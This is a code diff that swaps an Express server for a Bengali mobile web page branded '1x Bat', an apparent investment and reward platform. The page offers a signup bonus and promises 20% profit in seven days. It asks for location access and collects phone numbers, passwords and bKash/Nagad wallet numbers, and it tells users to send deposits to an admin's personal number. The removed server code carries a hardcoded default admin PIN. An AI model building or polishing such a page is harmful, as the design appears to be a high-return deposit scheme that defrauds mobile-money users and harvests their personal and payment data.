@@ -1,333 +1,1090 @@
-const express = require("express");
-const path = require("path");
-const fs = require("fs");
-const crypto = require("crypto");
-require("dotenv").config();
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>1x Bat – Professional Investment & Reward Platform</title>
+<style>
+:root{
+  --bg:#020704;
+  --card:#07120d;
+  --card2:#0b1912;
+  --line:#1e3d2e;
+  --green:#1be092;
+  --green2:#0ebc75;
+  --gold:#ffd34d;
+  --gold2:#ffb81f;
+  --text:#f7fff9;
+  --muted:#9bb0a3;
+  --danger:#ff7587;
+}
+*{box-sizing:border-box}
+html,body{
+  margin:0;min-height:100%;
+  font-family:Arial,"Noto Sans Bengali",sans-serif;
+  color:var(--text);
+  background:radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
+}
+body{overflow-x:hidden;padding-bottom:70px}
+.page{
+  width:100%;
+  max-width:460px;
+  margin:auto;
+  min-height:100vh;
+  padding:18px 16px 42px;
+  position:relative;
+}
+.ambient{
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  overflow:hidden;
+  z-index:0;
+}
+.orb{
+  position:absolute;
+  border-radius:50%;
+  filter:blur(10px);
+  opacity:.16;
+  animation:orbFloat 8s ease-in-out infinite;
+}
+.orb.one{width:180px;height:180px;background:#2dffab;left:-80px;top:12%}
+.orb.two{width:140px;height:140px;background:#ffd34d;right:-60px;top:42%;animation-delay:-3s}
+.orb.three{width:200px;height:200px;background:#1cff8d;left:20%;bottom:-110px;animation-delay:-5s}
+@keyframes orbFloat{
+  0%,100%{transform:translateY(0) scale(1)}
+  50%{transform:translateY(-24px) scale(1.06)}
+}
+.content{position:relative;z-index:1}
 
-const app = express();
-const PORT = Number(process.env.PORT || 3000);
-const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
-const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret");
-
-const DATA_DIR = path.join(__dirname, "data");
-const DB_FILE = path.join(DATA_DIR, "db.json");
-fs.mkdirSync(DATA_DIR, { recursive: true });
-
-let fileLockPromise = Promise.resolve();
-function withFileLock(operation) {
-  const res = fileLockPromise.then(() => operation());
-  fileLockPromise = res.catch(() => {});
-  return res;
+/* Highlight Notice Bar */
+.notice-bar{
+  background:linear-gradient(135deg,#1f4e38,#0d2b1e);
+  border:1px solid rgba(27,224,146,.3);
+  border-radius:14px;
+  padding:10px 14px;
+  margin-bottom:12px;
+  font-size:12px;
+  color:var(--gold);
+  display:flex;
+  align-items:center;
+  gap:10px;
+  box-shadow:0 8px 20px rgba(0,0,0,.3);
 }
 
-function defaultDb() {
-  return {
-    registrations: [],
-    investments: [],
-    transactions: [],
-    withdrawals: [],
-    deposits: [],
-    usedTrxIds: [],
-    promoTasks: [{ id: "promo_1", title: "YouTube Promo Visit", url: "https://youtube.com", reward: 45 }],
-    settings: {
-      noticeText: "📢 Professional Investment System লাইভ হয়েছে!",
-      noticeActive: true,
-      investEnabled: true,
-      minInvest: 100,
-      maxInvest: 50000,
-      investRate: 20,
-      investDuration: 7,
-      adminBkash: "01700000000",
-      adminNagad: "01800000000"
-    }
-  };
+.top-badge{
+  position:relative;
+  overflow:hidden;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:15px 16px;
+  margin-bottom:13px;
+  border-radius:20px;
+  border:1px solid rgba(255,211,77,.26);
+  background:linear-gradient(135deg,#0e3021,#0a1a12);
+  box-shadow:0 16px 42px rgba(0,0,0,.28);
+}
+.brand{
+  font-weight:1000;
+  font-size:18px;
+  letter-spacing:.5px;
+  color:#fff;
+}
+.brand span{color:var(--gold)}
+.top-icons{display:flex;gap:12px;font-size:18px;cursor:pointer;}
+.hero{
+  position:relative;
+  overflow:hidden;
+  padding:24px 18px 22px;
+  border-radius:30px;
+  text-align:center;
+  background:linear-gradient(155deg,#11563a,#07301f 48%,#06180f);
+  border:1px solid rgba(255,211,77,.26);
+  box-shadow:0 26px 70px rgba(0,0,0,.42);
+}
+.gift{
+  width:64px;height:64px;
+  margin:auto;
+  display:grid;place-items:center;
+  border-radius:20px;
+  font-size:32px;
+  background:linear-gradient(145deg,#ffd958,#e69b00);
+  box-shadow:0 14px 35px rgba(255,193,31,.25);
+}
+.hero .welcome{
+  margin-top:12px;
+  letter-spacing:2px;
+  font-size:11px;
+  font-weight:900;
+  color:#caffea;
+}
+.money{
+  display:inline-block;
+  margin:8px 0;
+  font-size:42px;
+  line-height:1;
+  font-weight:1000;
+  color:var(--gold);
 }
 
-function loadDb() {
+/* Bottom Navigation Bar */
+.bottom-nav{
+  position:fixed;
+  bottom:0; left:50%;
+  transform:translateX(-50%);
+  width:100%; max-width:460px;
+  background:#05120b;
+  border-top:1px solid var(--line);
+  display:flex;
+  justify-content:space-around;
+  padding:10px 4px;
+  z-index:50;
+}
+.nav-item{
+  background:none; border:0;
+  color:var(--muted);
+  font-size:10px;
+  font-weight:bold;
+  text-align:center;
+  cursor:pointer;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:2px;
+}
+.nav-item span.ico-nav{font-size:18px;}
+.nav-item.active{color:var(--green);}
+
+.card{
+  margin-top:15px;
+  padding:20px 16px;
+  border-radius:26px;
+  background:linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
+  border:1px solid var(--line);
+  box-shadow:0 25px 65px rgba(0,0,0,.38);
+}
+.head{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:15px;
+}
+.head-icon{
+  width:42px;height:42px;
+  display:grid;place-items:center;
+  border-radius:14px;
+  font-size:20px;
+  background:linear-gradient(145deg,#123d2b,#0b251a);
+  border:1px solid #295c43;
+}
+.head h2{margin:0;font-size:18px}
+.head p{margin:2px 0 0;color:var(--muted);font-size:11px}
+.msg{
+  display:none;
+  padding:12px 13px;
+  margin-bottom:13px;
+  border-radius:14px;
+  font-size:12px;
+  line-height:1.55;
+  animation:fadeIn .3s ease;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.msg.error{display:block;color:#ffb0ba;background:#35161b;border:1px solid #7b3540}
+.msg.success,.msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.field{margin-bottom:14px}
+.label{
+  display:block;
+  margin:0 0 7px 4px;
+  color:#c3d0c9;
+  font-size:12px;
+  font-weight:800;
+}
+.input-wrap{position:relative}
+.ico{
+  position:absolute;
+  left:15px;top:50%;
+  transform:translateY(-50%);
+  font-size:18px;
+}
+input, select{
+  width:100%;
+  height:52px;
+  padding:0 14px 0 46px;
+  border-radius:15px;
+  border:1px solid #294338;
+  background:#06100b;
+  color:#fff;
+  outline:none;
+  font-size:14px;
+}
+input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27,224,146,.08)}
+.hint{margin:-4px 3px 14px;color:#86a494;font-size:10px;line-height:1.5}
+.allow-btn{
+  position:relative;
+  overflow:hidden;
+  width:100%;
+  height:58px;
+  margin-top:8px;
+  border:0;
+  border-radius:17px;
+  cursor:pointer;
+  color:#062115;
+  background:linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
+  box-shadow:0 15px 36px rgba(24,205,137,.2);
+  font-weight:1000;
+  font-size:16px;
+}
+.allow-btn:disabled{filter:saturate(.45);cursor:not-allowed}
+.btn-inner{
+  position:relative;
+  z-index:2;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+.task-item, .plan-item, .tx-item{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:14px;
+  margin-bottom:10px;
+  border-radius:15px;
+  background:#06110b;
+  border:1px solid #20392d;
+}
+.task-info h4{margin:0 0 3px;font-size:14px}
+.task-info p{margin:0;color:var(--muted);font-size:11px}
+.task-btn{
+  padding:8px 14px;
+  border-radius:10px;
+  font-weight:900;
+  font-size:11px;
+  border:0;
+  background:var(--green);
+  color:#062015;
+  cursor:pointer;
+}
+
+.deposit-card-box{
+  background:#06100b;
+  border:1px solid #20392d;
+  border-radius:16px;
+  padding:16px;
+  margin-bottom:15px;
+}
+.payment-badge{
+  display:inline-block;
+  padding:4px 10px;
+  border-radius:8px;
+  font-size:12px;
+  font-weight:bold;
+  background:#113725;
+  color:#78efba;
+  margin-bottom:8px;
+}
+.amount-chip{
+  padding:8px 12px;
+  border-radius:10px;
+  border:1px solid #294338;
+  background:#06100b;
+  color:#fff;
+  font-weight:bold;
+  cursor:pointer;
+  font-size:13px;
+}
+.amount-chip:hover,.amount-chip.active{border-color:var(--green);background:#0b2a1d;color:var(--green);}
+
+/* Modal Styling */
+.admin-modal,.admin-panel{display:none}
+.admin-modal{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,.82);
+  backdrop-filter:blur(10px);
+  align-items:center;justify-content:center;
+  padding:18px;
+}
+.admin-modal.show{display:flex}
+.admin-login{
+  width:min(100%,390px);
+  padding:20px;border-radius:24px;
+  background:#08140e;border:1px solid #2a5a42;
+}
+.admin-login h3{margin:0 0 5px;font-size:20px}
+.admin-login p{margin:0 0 15px;color:var(--muted);font-size:12px}
+.admin-actions{display:flex;gap:9px}
+.admin-secondary{
+  width:100%;height:50px;border-radius:14px;
+  border:1px solid #33483e;background:#111b16;
+  color:#fff;font-weight:900;cursor:pointer;
+}
+.admin-panel{
+  position:fixed;inset:0;z-index:90;
+  overflow:auto;background:#031008;
+  padding:14px;
+}
+.admin-panel.show{display:block}
+.admin-shell{max-width:900px;margin:auto}
+.admin-top{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:10px;margin-bottom:12px;
+}
+.admin-top h2{margin:0;font-size:21px}
+.admin-top small{color:var(--muted)}
+.admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.stat{padding:14px;border-radius:16px;background:#0a1710;border:1px solid #213d2f}
+.stat b{display:block;font-size:22px;color:#fff}
+.stat span{font-size:10px;color:var(--muted)}
+.admin-card{margin-top:11px;padding:15px;border-radius:19px;background:#08140e;border:1px solid #203a2d}
+.admin-card h3{margin:0 0 12px}
+.admin-search{padding-left:14px!important}
+.record{margin-top:10px;padding:13px;border-radius:16px;background:#050e09;border:1px solid #1c3328}
+.record-top{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
+.record h4{margin:0 0 6px}
+.record .meta{color:#9db0a5;font-size:11px;line-height:1.65}
+.badge{
+  padding:5px 8px;border-radius:99px;
+  font-size:9px;font-weight:1000;
+  background:#113725;color:#78efba;white-space:nowrap;
+}
+.badge.pending{background:#3b2a11;color:#ffda73}
+.badge.rejected{background:#35161b;color:#ff9fab}
+.admin-btn{border:0;border-radius:10px;padding:9px 11px;font-weight:900;cursor:pointer}
+.admin-green{background:#19df92;color:#062015}
+.admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
+.admin-red{background:#35161b;color:#ff9fab;border:1px solid #71313c}
+.admin-row{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.admin-note{font-size:10px;color:#82988c;line-height:1.5}
+.admin-msg{display:none;margin-top:9px;padding:10px;border-radius:12px;font-size:11px}
+.admin-msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.admin-msg.error{display:block;background:#35161b;border:1px solid #7b3540;color:#ffb0ba}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<div class="ambient">
+  <div class="orb one"></div>
+  <div class="orb two"></div>
+  <div class="orb three"></div>
+</div>
+
+<main class="page">
+  <div class="content">
+
+    <!-- Highlight Notice Bar -->
+    <div class="notice-bar" id="highlightNoticeBar">
+      <span>📢</span> <span id="noticeBarText">সিস্টেম আপডেট সফল হয়েছে। নতুন প্রিমিয়াম ফিচার উপভোগ করুন!</span>
+    </div>
+
+    <section class="top-badge">
+      <div class="brand">1x Bat <span>V2 BONUS</span></div>
+      <div class="top-icons">
+        <span onclick="openNotificationModal()" title="Notifications">🔔</span>
+        <span id="adminTapTarget" title="Admin Secret" style="cursor:pointer;">🛡️</span>
+      </div>
+    </section>
+
+    <!-- Hero Section -->
+    <section class="hero">
+      <div class="gift">🎁</div>
+      <div class="welcome" id="heroWelcomeTitle">WELCOME BONUS</div>
+      <div class="money" id="displayBalance">৳100</div>
+      <p id="heroSubText" style="color:var(--muted);font-size:12px;">নিরাপদ রিওয়ার্ড এবং প্রিমিয়াম ইনভেস্টমেন্ট সিস্টেম</p>
+    </section>
+
+    <!-- AUTH & REGISTRATION VIEW -->
+    <div id="authView">
+      <div class="card" id="loginCard" style="display:none;">
+        <div class="head">
+          <div class="head-icon">🔑</div>
+          <div>
+            <h2>অ্যাকাউন্ট লগইন</h2>
+            <p>আপনার মোবাইল নাম্বার ও পাসওয়ার্ড দিন</p>
+          </div>
+        </div>
+        <div class="msg" id="loginMsg"></div>
+        <div class="field">
+          <label class="label">ফোন নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">📱</span>
+            <input id="loginPhone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+        <div class="field">
+          <label class="label">পাসওয়ার্ড</label>
+          <div class="input-wrap">
+            <span class="ico">🔒</span>
+            <input id="loginPassword" type="password" placeholder="পাসওয়ার্ড লিখুন">
+          </div>
+        </div>
+        <button class="allow-btn" onclick="handleLogin()">
+          <span class="btn-inner"><span>LOGIN →</span></span>
+        </button>
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(false)">
+          নতুন অ্যাকাউন্ট খুলতে চান? রেজিস্ট্রেশন করুন
+        </div>
+      </div>
+
+      <section class="card" id="registerStep">
+        <div class="head">
+          <div class="head-icon">👤</div>
+          <div>
+            <h2>নতুন অ্যাকাউন্ট</h2>
+            <p>সঠিক তথ্য দিয়ে ফর্ম পূরণ করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="formMsg"></div>
+        <div class="field">
+          <label class="label">আপনার নাম</label>
+          <div class="input-wrap"><span class="ico">👤</span><input id="name" type="text" placeholder="পূর্ণ নাম লিখুন"></div>
+        </div>
+        <div class="field">
+          <label class="label">ফোন নাম্বার</label>
+          <div class="input-wrap"><span class="ico">📱</span><input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX"></div>
+        </div>
+        <div class="field">
+          <label class="label">পাসওয়ার্ড</label>
+          <div class="input-wrap"><span class="ico">🔒</span><input id="password" type="password" placeholder="কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড"></div>
+        </div>
+        <div class="field">
+          <label class="label">বয়স</label>
+          <div class="input-wrap"><span class="ico">🎂</span><input id="age" type="number" min="18" max="100" placeholder="18+"></div>
+        </div>
+        <button class="allow-btn" id="allowBtn">
+          <span class="btn-inner"><span style="font-size:14px;">💰</span><span id="allowText">ALLOW LOCATION & REGISTER →</span></span>
+        </button>
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(true)">
+          ইতিমধ্যে অ্যাকাউন্ট আছে? লগইন করুন
+        </div>
+      </section>
+
+      <section class="card" id="paymentStep" style="display:none;">
+        <div class="head">
+          <div class="head-icon">💳</div>
+          <div>
+            <h2>পেমেন্ট মেথড</h2>
+            <p>৳100 বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="paymentMsg"></div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
+          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;">
+            <input type="radio" name="payment" value="bKash" checked> 📱 bKash
+          </label>
+          <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;">
+            <input type="radio" name="payment" value="Nagad"> 💳 Nagad
+          </label>
+        </div>
+        <div class="field">
+          <label class="label">bKash / Nagad নাম্বার</label>
+          <div class="input-wrap"><span class="ico">☎️</span><input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX"></div>
+        </div>
+        <button class="allow-btn" onclick="submitPayment()"><span class="btn-inner"><span>CONFIRM & GET BONUS →</span></span></button>
+      </section>
+
+      <section class="card" id="successStep" style="display:none;text-align:center;">
+        <div style="font-size:50px;margin-bottom:10px;">🎉</div>
+        <h2>রেজিস্ট্রেশন সফল!</h2>
+        <p style="color:var(--muted);font-size:12px;margin:10px 0 20px;">আপনার অ্যাকাউন্ট ভেরিফাই হয়েছে।</p>
+        <button class="allow-btn" onclick="enterDashboard()">DASHBOARD এ যান →</button>
+      </section>
+    </div>
+
+    <!-- MAIN DASHBOARD TABS -->
+    <div id="dashboardView" class="hidden">
+
+      <!-- HOME TAB -->
+      <div id="paneHome" class="card">
+        <div class="head">
+          <div class="head-icon">📊</div>
+          <div>
+            <h2>অ্যাকাউন্ট ওভারভিউ</h2>
+            <p>আপনার ব্যালেন্স এবং রেফারেল সামারি</p>
+          </div>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
+          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);">
+            <small style="color:var(--muted)">Total Balance</small>
+            <b id="dashTotalEarned" style="display:block;font-size:18px;color:var(--gold);margin-top:4px;">৳100</b>
+          </div>
+          <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);">
+            <small style="color:var(--muted)">Referrals</small>
+            <b id="dashReferralCount" style="display:block;font-size:16px;color:var(--green);margin-top:4px;">0 Users</b>
+          </div>
+        </div>
+        <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
+          <h4 style="margin:0 0 6px;font-size:14px;">👥 Referral Claim System</h4>
+          <p style="margin:0 0 10px;color:var(--muted);font-size:11px;" id="referralStatusDesc">যোগ্যতা পূরণ করে রেফারেল বোনাস ক্লেম করুন।</p>
+          <button class="task-btn" id="claimReferralBtn" onclick="claimReferralBonus()" style="width:100%;padding:10px;">Claim Referral Bonus</button>
+        </div>
+      </div>
+
+      <!-- PREMIUM DEPOSIT TAB -->
+      <div id="paneDeposit" class="card hidden">
+        <div class="head">
+          <div class="head-icon">💳</div>
+          <div>
+            <h2>Deposit System</h2>
+            <p>বিকাশ ও নগদের মাধ্যমে টপ-আপ করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="depositMsg"></div>
+        <div class="deposit-card-box">
+          <div class="payment-badge" id="depositMethodBadge">bKash Personal</div>
+          <p style="font-size:12px;color:var(--muted);margin:0 0 8px;">নিচের নাম্বারে সেন্ড মানি করুন:</p>
+          <div style="display:flex;align-items:center;justify-content:space-between;background:#030805;padding:10px 14px;border-radius:12px;border:1px solid #1a3326;">
+            <b id="adminWalletDisplay" style="font-size:16px;letter-spacing:1px;color:var(--gold);">01700000000</b>
+            <button class="task-btn" onclick="copyAdminNumber()">Copy Number</button>
+          </div>
+        </div>
+        <div class="field">
+          <label class="label">ডিপোজিট মাধ্যম</label>
+          <select id="depositMethod" onchange="updateAdminWalletDisplay()">
+            <option value="bKash">📱 bKash</option>
+            <option value="Nagad">💳 Nagad</option>
+          </select>
+        </div>
+        <div class="field">
+          <label class="label">টাকার পরিমাণ (৳)</label>
+          <input id="depositAmount" type="number" placeholder="সর্বনিম্ন ১০০ টাকা">
+        </div>
+        <div class="field">
+          <label class="label">Transaction ID (TrxID)</label>
+          <input id="depositTrxId" type="text" placeholder="যেমন: 9N7A6...">
+        </div>
+        <button class="allow-btn" onclick="submitDeposit()"><span class="btn-inner"><span>SUBMIT DEPOSIT →</span></span></button>
+      </div>
+
+      <!-- PREMIUM INVEST TAB -->
+      <div id="paneInvest" class="card hidden">
+        <div class="head">
+          <div class="head-icon">📈</div>
+          <div>
+            <h2>Premium Investment</h2>
+            <p>লাভজনক ও নিরাপদ বিনিয়োগ করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="investMsg"></div>
+
+        <!-- Profit Calculator & Amount Selection Box -->
+        <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
+          <h4 style="margin:0 0 8px;font-size:14px;">🧮 Profit Calculator & Amount</h4>
+          
+          <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
+            <button class="amount-chip" onclick="setInvestAmount(500, this)">৳500</button>
+            <button class="amount-chip" onclick="setInvestAmount(1000, this)">৳1,000</button>
+            <button class="amount-chip" onclick="setInvestAmount(2000, this)">৳2,000</button>
+            <button class="amount-chip" onclick="setInvestAmount(5000, this)">৳5,000</button>
+          </div>
+
+          <div class="field" style="margin-bottom:10px;">
+            <label class="label">বিনিয়োগের পরিমাণ (৳)</label>
+            <input id="calcAmount" type="number" placeholder="পরিমাণ লিখুন" oninput="calculateProfitPreview()">
+          </div>
+
+          <div style="background:#06100b;padding:12px;border-radius:10px;border:1px solid #1c3328;font-size:12px;line-height:1.7;" id="calcPreviewBox">
+            বিনিয়োগ: <b>৳0</b> | সম্ভাব্য মুনাফা: <b style="color:var(--green)">৳0</b><br>
+            মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳0</b>
+          </div>
+        </div>
+
+        <div style="font-size:10px;color:#ffb0ba;background:#35161b;padding:10px;border-radius:10px;margin-bottom:12px;line-height:1.5;">
+          ⚠️ <b>শর্তাবলী:</b> প্রকৃত রিটার্ন পরিবর্তনশীল এবং ১০০% নিশ্চিত নয়। মেয়াদ শেষ না হওয়া পর্যন্ত টাকা তোলা যাবে না।
+        </div>
+
+        <button class="allow-btn" id="investNowBtn" onclick="openInvestConfirmation()">
+          <span class="btn-inner"><span>INVEST NOW →</span></span>
+        </button>
+
+        <!-- Active Investments & History Section -->
+        <div style="margin-top:20px;">
+          <h4 style="margin:0 0 10px;font-size:15px;">📜 আপনার ইনভেস্টমেন্ট হিস্ট্রি</h4>
+          <div id="userInvestmentsContainer">
+            <div class="admin-note">লোড হচ্ছে...</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- PROMO TASKS TAB -->
+      <div id="paneTasks" class="card hidden">
+        <div class="head">
+          <div class="head-icon">📋</div>
+          <div>
+            <h2>Visit Promo Tasks</h2>
+            <p>লিংক ভিজিট করে রিওয়ার্ড অর্জন করুন</p>
+          </div>
+        </div>
+        <div id="promoTasksListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
+      </div>
+
+      <!-- WITHDRAW TAB -->
+      <div id="paneWithdraw" class="card hidden">
+        <div class="head">
+          <div class="head-icon">💸</div>
+          <div>
+            <h2>Withdraw Funds</h2>
+            <p>বিকাশ বা নগদের মাধ্যমে টাকা তুলুন</p>
+          </div>
+        </div>
+        <div class="msg" id="withdrawMsg"></div>
+        <div class="field"><label class="label">মেথড</label>
+          <select id="withdrawMethod"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select>
+        </div>
+        <div class="field"><label class="label">নাম্বার</label><input id="withdrawNumber" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div>
+        <div class="field"><label class="label">পরিমাণ (৳)</label><input id="withdrawAmount" type="number" placeholder="সর্বনিম্ন ৫০০ টাকা"></div>
+        <button class="allow-btn" onclick="submitWithdraw()"><span class="btn-inner"><span>SUBMIT WITHDRAW →</span></span></button>
+      </div>
+
+      <!-- WALLET TAB -->
+      <div id="paneWallet" class="card hidden">
+        <div class="head">
+          <div class="head-icon">📜</div>
+          <div>
+            <h2>Transaction History</h2>
+            <p>সমস্ত লেনদেনের বিবরণ</p>
+          </div>
+        </div>
+        <div id="transactionListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
+      </div>
+
+      <!-- PROFILE TAB -->
+      <div id="paneProfile" class="card hidden">
+        <div class="head">
+          <div class="head-icon">⚙️</div>
+          <div>
+            <h2>User Profile</h2>
+            <p>অ্যাকাউন্ট সেটিংস</p>
+          </div>
+        </div>
+        <div style="font-size:13px; line-height:1.8; color:var(--muted); margin-bottom:15px;" id="profileDetails">লোডিং...</div>
+        <button class="allow-btn" style="background:#3a1418;color:#ff8e99;" onclick="logout()">LOGOUT</button>
+      </div>
+
+    </div>
+
+  </div>
+</main>
+
+<!-- INVEST CONFIRMATION MODAL -->
+<div class="admin-modal" id="investConfirmModal">
+  <div class="admin-login">
+    <h3>📈 Investment Confirmation</h3>
+    <p>নিচের বিবরণ যাচাই করুন</p>
+    <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);font-size:13px;line-height:1.8;margin-bottom:15px;" id="confirmModalBody"></div>
+    <div class="admin-actions">
+      <button class="admin-secondary" onclick="$('investConfirmModal').classList.remove('show')">CANCEL</button>
+      <button class="allow-btn" id="confirmInvestBtn" style="height:50px;margin:0;" onclick="confirmAndSubmitInvestment()">CONFIRM INVEST</button>
+    </div>
+  </div>
+</div>
+
+<!-- BOTTOM NAVIGATION BAR -->
+<nav class="bottom-nav hidden" id="bottomNavBar">
+  <button class="nav-item active" id="navHome" onclick="switchTab('home')"><span class="ico-nav">🏠</span>Home</button>
+  <button class="nav-item" id="navDeposit" onclick="switchTab('deposit')"><span class="ico-nav">💳</span>Deposit</button>
+  <button class="nav-item" id="navInvest" onclick="switchTab('invest')"><span class="ico-nav">📈</span>Invest</button>
+  <button class="nav-item" id="navTasks" onclick="switchTab('tasks')"><span class="ico-nav">📋</span>Tasks</button>
+  <button class="nav-item" id="navWithdraw" onclick="switchTab('withdraw')"><span class="ico-nav">💸</span>Withdraw</button>
+  <button class="nav-item" id="navWallet" onclick="switchTab('wallet')"><span class="ico-nav">📜</span>Wallet</button>
+  <button class="nav-item" id="navProfile" onclick="switchTab('profile')"><span class="ico-nav">👤</span>Profile</button>
+</nav>
+
+<!-- ADMIN MODAL -->
+<div class="admin-modal" id="adminModal">
+  <div class="admin-login">
+    <h3>🔐 Admin Access</h3>
+    <p>পিন কোড দিন</p>
+    <div class="msg" id="adminPinMsg"></div>
+    <div class="field"><input id="adminPin" type="password" inputmode="numeric" maxlength="4" placeholder="PIN"></div>
+    <div class="admin-actions">
+      <button class="admin-secondary" onclick="$('adminModal').classList.remove('show')">CANCEL</button>
+      <button class="allow-btn" id="adminLoginBtn" style="height:50px;margin:0">LOGIN</button>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<section class="admin-panel" id="adminPanel">
+  <div class="admin-shell">
+    <div class="admin-top">
+      <div><h2>🛡️ Admin Panel</h2></div>
+      <button class="admin-btn admin-dark" onclick="$('adminPanel').classList.remove('show')">Close</button>
+    </div>
+    <div class="admin-card">
+      <h3>⚙️ Investment & System Settings</h3>
+      <div class="field" style="display:flex;align-items:center;gap:10px;">
+        <input type="checkbox" id="adminInvestEnabled" style="width:20px;height:20px;">
+        <label class="label" style="margin:0;cursor:pointer;">Enable Investment System</label>
+      </div>
+      <div class="admin-row">
+        <div class="field"><label class="label">Min Invest (৳)</label><input class="admin-search" id="adminMinInvest" type="number"></div>
+        <div class="field"><label class="label">Max Invest (৳)</label><input class="admin-search" id="adminMaxInvest" type="number"></div>
+      </div>
+      <div class="admin-row">
+        <div class="field"><label class="label">Profit Rate (%)</label><input class="admin-search" id="adminInvestRate" type="number"></div>
+        <div class="field"><label class="label">Duration (Days)</label><input class="admin-search" id="adminInvestDuration" type="number"></div>
+      </div>
+      <button class="admin-btn admin-green" onclick="saveAdminSettings()">SAVE SETTINGS</button>
+    </div>
+  </div>
+</section>
+
+<script>
+const $ = id => document.getElementById(id);
+let currentUser = null;
+let watchId = null;
+let appGlobalSettings = { investEnabled: true, minInvest: 100, maxInvest: 50000, investRate: 20, investDuration: 7, adminBkash: "01700000000", adminNagad: "01800000000" };
+
+function validPhone(v){ return /^01[3-9]\d{8}$/.test(String(v || "").trim()); }
+function showMsg(id,text,type="error"){ const b=$(id); if(b){b.className="msg "+type; b.textContent=text; b.style.display="block";}}
+function clearMsg(id){ const b=$(id); if(b) b.style.display="none"; }
+
+document.addEventListener("DOMContentLoaded", () => {
+  const saved = localStorage.getItem("v2_user_data");
+  if(saved) { currentUser = JSON.parse(saved); fetchUserDataQuietly(); }
+  fetchPublicSettings();
+});
+
+async function fetchPublicSettings() {
   try {
-    if (!fs.existsSync(DB_FILE)) {
-      const db = defaultDb();
-      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
-      return db;
+    const r = await fetch("/api/settings");
+    const d = await r.json();
+    if(d.ok && d.settings) {
+      appGlobalSettings = d.settings;
+      if(d.settings.noticeActive) {
+        $("highlightNoticeBar").style.display = "flex";
+        $("noticeBarText").textContent = d.settings.noticeText;
+      } else { $("highlightNoticeBar").style.display = "none"; }
+      updateAdminWalletDisplay();
     }
-    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
-    return {
-      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
-      investments: Array.isArray(parsed.investments) ? parsed.investments : [],
-      transactions: Array.isArray(parsed.transactions) ? parsed.transactions : [],
-      withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
-      deposits: Array.isArray(parsed.deposits) ? parsed.deposits : [],
-      usedTrxIds: Array.isArray(parsed.usedTrxIds) ? parsed.usedTrxIds : [],
-      promoTasks: Array.isArray(parsed.promoTasks) ? parsed.promoTasks : defaultDb().promoTasks,
-      settings: { ...defaultDb().settings, ...(parsed.settings || {}) }
-    };
-  } catch { return defaultDb(); }
+  } catch(e){}
 }
 
-function saveDb(db) {
-  const tmp = DB_FILE + ".tmp";
-  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
-  fs.renameSync(tmp, DB_FILE);
-}
-
-function clean(v, max = 200) { return String(v || "").trim().slice(0, max); }
-
-function signSession(payload) {
-  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
